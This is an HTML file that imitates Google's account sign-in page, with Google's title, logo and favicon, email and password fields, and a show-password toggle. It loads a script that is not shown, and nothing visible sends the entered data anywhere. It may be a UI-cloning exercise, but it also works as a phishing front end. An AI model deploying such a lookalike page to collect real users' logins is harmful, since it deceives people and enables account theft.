<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in - Google Accounts</title>
    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google">
            <div class="sign-in-container">
                <h1 class="sign-in">Sign in</h1>
                <p>with your Google Account</p>
            </div>
        </header>
        <form class="form">
            <div class="form-group">
                <input type="email" class="form-control" name="email" required>
                <label for="" class="form-label">Enter your email</label>
            </div>

            <div class="form-group">
                <input type="password" class="form-control" name="password" id="txtPassword" required>
                <label for="" class="form-label">Enter Your Password</label>
            </div>

            <div class="form-group">
                <label class="showLabel">
                    <input type="checkbox" id="show"> 
                    Show Password
                </label>
            </div>

            <div class="submit-container">
                <a href="https://support.google.com/accounts/answer/41078?hl=en&co=GENIE.Platform%3DDesktop" class="link">Forget password?</a>
                <button type="submit" class="submit-btn">Next</button>
            </div>
        </form>
    </div>
    <script src="index.js"></script>
</body>
</html>
